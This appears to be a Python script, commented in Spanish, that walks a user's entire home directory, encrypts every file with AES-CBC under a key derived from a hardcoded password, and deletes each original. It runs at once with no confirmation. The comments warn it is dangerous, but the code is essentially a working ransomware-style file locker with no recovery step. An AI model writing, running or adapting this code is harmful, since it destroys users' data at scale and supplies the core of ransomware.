import os
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Configuración
archivo_clave = "clave.enc"  # Archivo donde se guardará la clave AES
directorio_raiz = "/Users/fabianramirez"  # ⚠ PELIGROSO: Prueba primero en "/Users/TuUsuario/Prueba"

def generar_clave(password: str, salt: bytes) -> bytes:
    """Genera una clave AES de 32 bytes (256 bits) usando PBKDF2 y la guarda en un archivo."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    clave = kdf.derive(password.encode())

    # Guardar clave en un archivo seguro
    with open(archivo_clave, "wb") as f:
        f.write(base64.b64encode(salt) + b"\n")  # Guardar salt
        f.write(base64.b64encode(clave))  # Guardar clave cifrada en Base64

    print(f"🔐 Clave guardada en: {archivo_clave}")
    return clave

def cargar_clave() -> bytes:
    """Carga la clave AES desde el archivo."""
    with open(archivo_clave, "rb") as f:
        salt = base64.b64decode(f.readline().strip())  # Leer salt
        clave = base64.b64decode(f.readline().strip())  # Leer clave
    print("🔑 Clave cargada desde el archivo.")
    return clave

def cifrar_archivo(ruta: str, clave: bytes):
    """Cifra un archivo usando AES en modo CBC y elimina el original."""
    try:
        iv = os.urandom(16)  # IV aleatorio
        with open(ruta, "rb") as f:
            datos = f.read()

        # Rellenar datos para que sean múltiplos de 16 bytes
        padding = 16 - (len(datos) % 16)
        datos_padded = datos + bytes([padding] * padding)

        cipher = Cipher(algorithms.AES(clave), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        datos_cifrados = encryptor.update(datos_padded) + encryptor.finalize()

        # Guardar archivo cifrado
        ruta_cifrada = ruta + ".enc"
        with open(ruta_cifrada, "wb") as f:
            f.write(base64.b64encode(iv) + b"\n")  # Guardar IV
            f.write(base64.b64encode(datos_cifrados))  # Guardar datos cifrados

        print(f"✅ Archivo cifrado: {ruta_cifrada}")

        # 🚨 Eliminar archivo original después de cifrarlo
        os.remove(ruta)
        print(f"🗑 Archivo original eliminado: {ruta}")

    except Exception as e:
        print(f"❌ Error cifrando {ruta}: {e}")

def recorrer_y_cifrar(directorio: str, clave: bytes):
    """Recorre los archivos desde el directorio raíz y los cifra, eliminando los originales."""
    for carpeta_raiz, _, archivos in os.walk(directorio):
        for archivo in archivos:
            ruta_completa = os.path.join(carpeta_raiz, archivo)
            if not ruta_completa.endswith(".enc") and archivo != os.path.basename(archivo_clave):  
                cifrar_archivo(ruta_completa, clave)

# 1️⃣ Si la clave no existe, generarla y guardarla
if not os.path.exists(archivo_clave):
    print("🔵 Generando clave...")
    salt = os.urandom(16)  # Salt aleatorio
    clave = generar_clave("mi_contraseña_segura", salt)
else:
    print("🟢 Cargando clave existente...")
    clave = cargar_clave()

# 2️⃣ Ejecutar el cifrado (⚠ PELIGROSO en "/". Prueba primero en "/Users/TuUsuario/Prueba")
recorrer_y_cifrar(directorio_raiz, clave)
